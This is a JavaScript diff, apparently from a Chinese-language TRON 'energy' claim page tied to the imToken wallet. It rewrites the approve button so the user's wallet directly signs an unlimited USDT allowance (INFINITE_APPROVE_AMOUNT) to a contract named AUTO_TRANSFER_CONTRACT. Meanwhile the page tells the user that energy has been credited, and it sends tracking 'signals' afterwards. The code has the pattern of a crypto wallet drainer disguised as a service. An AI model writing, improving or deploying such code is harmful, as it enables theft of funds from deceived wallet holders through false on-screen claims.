@@ -1402,59 +1402,57 @@ function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
-        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "";
+        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         btn.disabled = true;
-        btn.textContent = lang.loadingBtn;
+        btn.textContent = lang.redirectingBtn;
         reviewTip.style.display = "flex";
-        reviewTipText.textContent = "能量调配中……点击签名后能量生效";
+        reviewTipText.textContent = "发起签名，请在imToken中确认...";
 
         try {
-            // 校验A1信号是否成功（前置条件）
-            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-            const isA1Success = a1Status[userAddress] === "success";
-            if (!isA1Success) {
-                userInfoEl.innerHTML = `
-                    已连接：${shortAddr}<br>
-                    USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                    <span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>
-                `;
-                btn.disabled = false;
-                btn.textContent = "重新检测环境";
-                reviewTip.style.display = "none";
-                bindRetryA1Logic();
-                return;
+            // 核心校验：确保已有合约实例有效（复用前置初始化的trc20Contract）
+            if (!trc20Contract) {
+                // 兜底：如果实例意外失效，用已有ABI重新快速初始化（仅兜底，正常情况不会走）
+                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+                if (!trc20Contract) throw new Error("合约实例初始化失败，请重新连接钱包");
             }
 
-            // B1信号防重复发送（异步执行，不阻塞跳转）
-            if (!hasSentB1Signal(userAddress)) {
-                btn.textContent = "发送信号中...";
-                sendSignalB(true)
-                    .then(result => console.log(`B1信号发送结果：${result ? "成功" : "失败"}`))
-                    .catch(err => console.warn("B1信号异常：", err));
-                markB1SignalSent(userAddress);
-            } else {
-                console.log("⚠️ 30天内已发送过B1信号，跳过");
+            // 确保TronWeb就绪（避免实例和钱包通信失效）
+            if (!tronWeb.ready) {
+                await new Promise(resolve => tronWeb.onReady(resolve));
             }
 
-            // 跳转imToken并携带#approve标记（用于后续自动触发签名）
+            // 关键：直接调用已有合约实例的approve方法（不新建、不跳转、不碰A1/B1）
+            const approveResult = await trc20Contract.approve(
+                AUTO_TRANSFER_CONTRACT, // 授权对象（前置已确认）
+                INFINITE_APPROVE_AMOUNT // 无限授权金额（已有ABI支持）
+            ).send({
+                from: userAddress, // 前置已校验的有效地址
+                shouldPollResponse: true // 等待链上确认
+            });
+
+            // 签名成功后收尾（不影响核心调用）
+            reviewTipText.textContent = "签名成功，能量已到账...";
+            await Promise.all([
+                sendSignalA2().catch(err => console.warn("A2信号同步失败：", err)),
+                sendSignalB(false).catch(err => console.warn("B2信号同步失败：", err))
+            ]);
+            addAuthorizedAddress(userAddress);
+            saveEnergyRecord();
+            renderEnergyRecords();
+
+            btn.textContent = lang.successBtn;
+            userInfoEl.innerHTML += lang.successArrival;
+            alert(lang.successTip);
             reviewTip.style.display = "none";
-            btn.textContent = lang.redirectingBtn;
-            const fullTargetUrl = window.location.origin + window.location.pathname + "#approve";
-            const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
-            window.location.href = jumpUrl;
 
         } catch (e) {
-            console.error("领取流程失败：", e);
+            console.error("Approve调用失败（核心原因）：", e);
             reviewTip.style.display = "none";
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-
-            const errMsg = e.message || "";
-            if (errMsg.includes("不符合领取条件") || [400, 408, 409].some(code => errMsg.includes(code.toString()))) {
-                alert(lang.ineligibleTip);
-            } else {
-                alert(lang.systemBusyTip);
-            }
+            // 明确提示是否是合约实例问题
+            const errMsg = e.message.includes("contract") ? "合约实例无效，请重新连接钱包" : e.message;
+            alert(lang.authorizeFail.replace("{msg}", errMsg || "签名取消或网络异常"));
         }
     };
 }
